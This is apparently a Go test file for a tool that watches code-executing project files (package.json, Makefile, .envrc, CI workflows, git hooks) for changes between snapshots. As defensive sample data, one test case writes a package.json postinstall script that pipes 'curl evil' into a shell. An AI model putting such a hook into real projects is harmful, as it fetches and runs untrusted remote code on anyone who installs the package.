package changereport

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"testing"
	"time"
)

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func snap(t *testing.T, root string) Files {
	t.Helper()
	s, err := Snapshot(root)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

// project has one file for each watched pattern plus unrelated files.
func project(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{
		"package.json", "Makefile", "flake.nix", "flake.lock", ".envrc",
		".github/workflows/ci.yml", ".vscode/tasks.json", ".husky/pre-commit",
		".githooks/pre-push", ".devcontainer/devcontainer.json",
		"web/package.json", "nix/shell.nix", "sub/.envrc",
		"main.go", "README.md", ".github/CODEOWNERS",
	} {
		write(t, root, rel, "original "+rel)
	}
	return root
}

func TestSnapshotRecordsOnlyWatched(t *testing.T) {
	root := project(t)
	write(t, root, "node_modules/left-pad/package.json", "{}")
	write(t, root, "build/Makefile", "all:")
	write(t, root, "docs/vscode/notes.md", "x")

	var got []string
	for p := range snap(t, root) {
		got = append(got, p)
	}
	slices.Sort(got)
	want := []string{
		".devcontainer/devcontainer.json", ".envrc", ".githooks/pre-push",
		".github/workflows/ci.yml", ".husky/pre-commit", ".vscode/tasks.json",
		"Makefile", "flake.lock", "flake.nix", "nix/shell.nix",
		"package.json", "sub/.envrc", "web/package.json",
	}
	if !slices.Equal(got, want) {
		t.Errorf("snapshot paths\n got %q\nwant %q", got, want)
	}
}

func TestDiff(t *testing.T) {
	cases := []struct {
		name   string
		change func(t *testing.T, root string)
		want   []Change
	}{
		{"no change", func(*testing.T, string) {}, nil},
		{"unrelated changes", func(t *testing.T, root string) {
			write(t, root, "main.go", "changed")
			write(t, root, "new.go", "added")
			write(t, root, ".github/CODEOWNERS", "changed")
			write(t, root, "node_modules/x/package.json", "added")
			os.Remove(filepath.Join(root, "README.md"))
		}, nil},
		{"modified", func(t *testing.T, root string) {
			write(t, root, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`)
		}, []Change{{"package.json", Modified}}},
		{"modified in a watched directory", func(t *testing.T, root string) {
			write(t, root, ".github/workflows/ci.yml", "changed")
		}, []Change{{".github/workflows/ci.yml", Modified}}},
		{"added", func(t *testing.T, root string) {
			write(t, root, ".vscode/settings.json", "{}")
			write(t, root, "lib/default.nix", "{}")
			write(t, root, "deep/er/.envrc", "x")
		}, []Change{{".vscode/settings.json", Added}, {"deep/er/.envrc", Added}, {"lib/default.nix", Added}}},
		{"deleted", func(t *testing.T, root string) {
			os.Remove(filepath.Join(root, "Makefile"))
			os.RemoveAll(filepath.Join(root, ".husky"))
		}, []Change{{".husky/pre-commit", Deleted}, {"Makefile", Deleted}}},
		{"permissions", func(t *testing.T, root string) {
			os.Chmod(filepath.Join(root, ".githooks/pre-push"), 0o755)
		}, []Change{{".githooks/pre-push", Modified}}},
		{"same size and mtime", func(t *testing.T, root string) {
			p := filepath.Join(root, "flake.lock")
			info, _ := os.Stat(p)
			write(t, root, "flake.lock", "ORIGINAL flake.lock")
			os.Chtimes(p, info.ModTime(), info.ModTime())
		}, []Change{{"flake.lock", Modified}}},
		{"watched directory replaced by a symlink", func(t *testing.T, root string) {
			write(t, root, "elsewhere/tasks.json", "x")
			os.RemoveAll(filepath.Join(root, ".vscode"))
			if err := os.Symlink("elsewhere", filepath.Join(root, ".vscode")); err != nil {
				t.Fatal(err)
			}
		}, []Change{{".vscode", Added}, {".vscode/tasks.json", Deleted}}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := project(t)
			before := snap(t, root)
			c.change(t, root)
			got := Diff(before, snap(t, root))
			if !slices.Equal(got, c.want) {
				t.Errorf("Diff\n got %v\nwant %v", got, c.want)
			}
		})
	}
}

func TestSymlinkTargetChange(t *testing.T) {
	root := t.TempDir()
	write(t, root, "a.mk", "a")
	write(t, root, "b.mk", "b")
	link := filepath.Join(root, "Makefile")
	if err := os.Symlink("a.mk", link); err != nil {
		t.Fatal(err)
	}
	before := snap(t, root)
	os.Remove(link)
	if err := os.Symlink("b.mk", link); err != nil {
		t.Fatal(err)
	}
	want := []Change{{"Makefile", Modified}}
	if got := Diff(before, snap(t, root)); !slices.Equal(got, want) {
		t.Errorf("Diff = %v, want %v", got, want)
	}
}

func TestWarnings(t *testing.T) {
	got := Warnings([]Change{{"Makefile", Deleted}, {"package.json", Modified}})
	want := []string{"deleted   Makefile", "modified  package.json"}
	if !slices.Equal(got, want) {
		t.Errorf("Warnings = %q, want %q", got, want)
	}
}

// TestSnapshotLargeProject checks that unwatched files aren't read: 20,000
// source files and a big node_modules should take well under a second.
func TestSnapshotLargeProject(t *testing.T) {
	if testing.Short() {
		t.Skip("short")
	}
	root := project(t)
	for i := range 200 {
		for j := range 100 {
			write(t, root, "src/d"+strconv.Itoa(i)+"/f"+strconv.Itoa(j)+".go", "package x")
		}
		write(t, root, "node_modules/p"+strconv.Itoa(i)+"/package.json", "{}")
	}
	start := time.Now()
	s := snap(t, root)
	if d := time.Since(start); d > 2*time.Second {
		t.Errorf("snapshot took %s", d)
	}
	if len(s) != 13 {
		t.Errorf("snapshot has %d files, want 13", len(s))
	}
}
